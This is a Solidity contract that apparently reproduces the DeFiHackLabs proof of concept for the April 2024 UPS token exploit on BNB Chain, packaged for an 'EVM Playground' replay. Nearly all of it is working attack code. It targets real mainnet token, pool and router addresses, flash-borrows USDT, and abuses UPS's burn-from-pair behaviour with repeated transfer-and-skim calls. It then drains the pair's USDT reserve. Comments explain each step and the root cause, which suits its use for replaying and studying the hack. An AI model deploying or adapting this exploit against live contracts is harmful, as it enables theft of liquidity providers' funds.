// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-04-UPS).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract (the
// PancakeSwap V3 flash callback `pancakeV3FlashCallback` lives on the test itself,
// so there is no standalone contract to deploy). This contract is a faithful,
// self-contained copy of that inline attack (testExploit body -> run(), plus the
// flash callback and the internal swap helper) so the playground can deploy it and
// record run(). Logic and constants are copied verbatim from
// test/UPS_exp.sol::ContractTest.
//
// Root cause: UPS._update burns UPS directly out of its own PancakeSwap V2 pair on
// every sell (to == pair) and then forces sync() -- an uncompensated removal of the
// pair's UPS reserve. Combined with skim(), the attacker can sell into the pair and
// immediately skim the freshly-credited UPS back, repeating almost for free and
// collapsing the UPS reserve toward zero while USDT stays fixed, then extracting the
// USDT with a couple of direct swaps against the now-starved pool.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IUniPairV3 {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IUniPairV2 {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes memory data) external;
    function sync() external;
    function skim(address to) external;
}

interface IUniRouterV2 {
    function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut)
        external
        pure
        returns (uint256 amountOut);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract UPSDrain {
    IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 constant UPS = IERC20(0x3dA4828640aD831F3301A4597821Cc3461B06678);
    IUniPairV3 constant pool = IUniPairV3(0x4f31Fa980a675570939B737Ebdde0471a4Be40Eb);
    IUniPairV2 constant ups_usdt = IUniPairV2(0xA2633ca9Eb7465E7dB54be30f62F577f039a2984);
    IUniRouterV2 constant router = IUniRouterV2(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    uint256 borrow_amount;

    // step 0: flash-borrow 3,500,000 USDT from the PancakeSwap V3 pool; the
    // callback below does the whole attack.
    function run() external {
        borrow_amount = 3_500_000 ether;
        pool.flash(address(this), borrow_amount, 0, "");
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256, /*fee1*/ bytes memory /*data*/ ) public {
        // step 1: donate 2,000,000 USDT straight to the pair, then sync() --
        // inflates reserveUSDT without touching reserveUPS.
        USDT.transfer(address(ups_usdt), 2_000_000 ether);
        ups_usdt.sync();

        // step 2: the one honest leg -- buy ~781,100,330 UPS for 1,000,000 USDT.
        swap_token_to_token(address(USDT), address(UPS), 1_000_000 ether);

        // step 3: sell-into-pair + skim loop. Each transfer to the pair triggers
        // UPS._swapBurn, which burns UPS out of the pair's own balance and forces
        // sync() -- collapsing reserveUPS while reserveUSDT stays fixed. skim()
        // returns the freshly-credited UPS back to the attacker almost for free.
        uint256 i = 0;
        uint256 pair_balance = 0;
        uint256 here_balance = 0;
        uint256 transfer_amount = 0;
        while (i < 10) {
            pair_balance = UPS.balanceOf(address(ups_usdt));
            here_balance = UPS.balanceOf(address(this));
            if (here_balance > pair_balance) {
                transfer_amount = pair_balance;
            } else {
                transfer_amount = here_balance;
            }
            UPS.transfer(address(ups_usdt), transfer_amount);
            ups_usdt.skim(address(this));
            i++;
        }

        // step 4: with reserveUPS collapsed near zero, feed tiny amounts of UPS
        // into the pair via 3 direct swap() calls -- each wei of UPS is now worth
        // an enormous amount of USDT, draining the pair's real USDT reserve.
        i = 0;
        while (i < 3) {
            transfer_amount = UPS.balanceOf(address(ups_usdt));
            UPS.transfer(address(ups_usdt), transfer_amount);
            (uint256 r0, uint256 r1,) = ups_usdt.getReserves();
            uint256 amountOut = router.getAmountOut(transfer_amount - r0, r0, r1);
            ups_usdt.swap(0, amountOut, address(this), "");
            i++;
        }

        // step 5: repay the flash loan + fee, keeping the rest as profit.
        USDT.transfer(address(pool), borrow_amount + fee0);
    }

    function swap_token_to_token(address a, address b, uint256 amount) internal {
        IERC20(a).approve(address(router), amount);
        address[] memory path = new address[](2);
        path[0] = a;
        path[1] = b;
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp);
    }
}
